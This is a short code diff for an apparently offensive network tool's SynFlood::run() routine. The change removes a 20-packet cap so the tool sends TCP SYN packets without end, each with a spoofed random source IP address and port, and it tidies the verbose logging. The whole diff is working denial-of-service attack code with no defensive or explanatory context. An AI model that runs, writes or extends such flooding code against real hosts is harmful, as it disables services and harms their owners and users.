@@ -46,8 +46,7 @@ void SynFlood::run() {
 		NetworkUtilities::printUcharMac(*targetMac);
 		cout << endl;
 		cout << "[+] SYN floodind in progress..." << endl;
-		int i=0;
-		for(i=0;i<20;++i) {
+		for(;;) {
 			ucharMac macSource = _deviceMac;
 			int srcPort = rand()%65535;
 			u_int32_t sAddr = rand() % 0xffffffff;
@@ -62,12 +61,14 @@ void SynFlood::run() {
 			syn.setSeq((rand()%65536)*(rand()%65536));
 			//Send SYN packet.
 			int res = syn.send();
-			if (_verbose && res == 0) {
-					cout << "[+] TCP SYN sended to ";
-					NetworkUtilities::printUint32Ip(ipDest);
-					cout << ":" << _port << " from ";
-					NetworkUtilities::printUint32Ip(sAddr);
-					cout << ":" << srcPort << endl;
+			if (res == 0) {
+				if (_verbose) {
+						cout << "[+] TCP SYN sended to ";
+						NetworkUtilities::printUint32Ip(ipDest);
+						cout << ":" << _port << " from ";
+						NetworkUtilities::printUint32Ip(sAddr);
+						cout << ":" << srcPort << endl;
+				}
 			} else {
 				cerr << "[-] Error for send packet." << endl;
 			}
